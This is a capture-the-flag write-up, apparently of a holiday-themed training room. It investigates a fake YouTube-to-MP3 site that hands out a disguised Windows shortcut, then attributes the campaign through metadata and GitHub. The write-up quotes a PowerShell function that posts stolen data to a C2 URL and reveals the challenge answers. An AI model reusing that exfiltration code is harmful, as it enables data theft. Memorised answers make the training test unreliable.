# Maybe SOC-mas Music, He Thought, Doesn't Come from a Store?

## The Story
> McSkidy tapped keys with a confident grin,  
> A suspicious website, now where to begin?  
> She'd seen sites like this, full of code and of grime,  
> Shady domains, and breadcrumbs easy to find.

McSkidy's fingers flew across the keyboard, her eyes narrowing at the suspicious website on her screen. She had seen dozens of malware campaigns like this. This time, the trail led straight to someone who went by the name **"Glitch."**

"Too easy," she muttered with a smirk.

"I still have time," she said, leaning closer to the screen. "Maybe there's more."

Little did she know, beneath the surface lay something far more complex than a simple hacker's handle. This was just the beginning of a tangled web unraveling everything she thought she knew.

---

## Learning Objectives
- Learn how to investigate malicious link files.
- Understand OPSEC and common OPSEC mistakes.
- Learn to track and attribute digital identities in cyber investigations.

---

## Investigating the Website
The website under investigation is a **YouTube-to-MP3 converter** being shared amongst the organizers of SOC-mas. Reports have raised concerns about its safety, and you've decided to dig deeper.

- **Task**: Access the website by visiting `MACHINE_IP` using a web browser.

---

## Getting Some Tunes

Let's find out by pasting any YouTube link in the search form and pressing the **"Convert"** button.  
Then select either the `mp3` or `mp4` option. This will download a file that we can use for investigation.  

For example, you can use the following YouTube link:  
[https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ).

### Steps:
1. Once the file is downloaded, navigate to your **Downloads** folder using the terminal.
2. Use the following command to extract the contents of the downloaded zip file:
   ```bash
   unzip download.zip -d download

3. After extracting, you will see two files:
   - `song.mp3`
   - `somg.mp3`

4. Run the file command on each file to check its type. For example, start by checking song.mp3:
   ```bash
   file song.mp3
   ```
   **Output**
   ```bash
   song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
   ```

   Next, check the second file `somg.mp3`
   ```bash
   file somg.mp3
   ```
   **Output**
   ```bash
   somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
   ```

## Questions and Answers
1. **Looks like the song.mp3 file is not what we expected! Run `exiftool song.mp3` in your terminal to find out the author of the song. Who is the author?**   
   <details>
      <summary>Click to reveal the answer</summary> Tyler Ramsbey
   </details>

2. **The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?**

   Search the following link:  
   [https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)

   We found a function in the script that sends the stolen info to a C2 server:  
   ```powershell
   function Send-InfoToC2Server {
       $c2Url = "http://papash3ll.thm/data"
       $data = Get-Content -Path $infoFilePath -Raw

       # Using Invoke-WebRequest to send data to the C2 server
       Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
   }
   ```
   <details>
      <summary>Click to reveal the answer</summary> http://papash3ll.thm/data
   </details>

3. **Who is M.M? Maybe his Github profile page would provide clues?**

   Investigating his GitHub profile ([https://github.com/MM-WarevilleTHM](https://github.com/MM-WarevilleTHM)), I found a README file containing the following introduction:
   > Hi, I’m M.M, also known as Mayor Malware. I run things in Wareville Town.
   <details>
      <summary>Click to reveal the answer</summary> Mayor Malware
   </details>

4. **What is the number of commits on the GitHub repo where the issue was raised?**

   Check out the commit history here: [https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/commits/main/](https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/commits/main/)

   <details>
      <summary>Click to reveal the answer</summary>
      1
   </details>

## Conclusions

In this challenge, we explored various aspects of cyber investigation, focusing on analyzing suspicious files, tracking digital identities, and understanding how malicious scripts operate. We learned the importance of examining metadata, using tools like `exiftool` and `file` to gather information about the files involved, and how seemingly innocent files can sometimes hide malicious code or redirections.

By investigating the GitHub profiles, commit history, and the PowerShell script, we gained a deeper understanding of how attackers might operate and how we can track their actions back to their origins. This exercise reinforced the importance of thorough investigation, keeping in mind the potential OPSEC mistakes that might lead us to the answers.



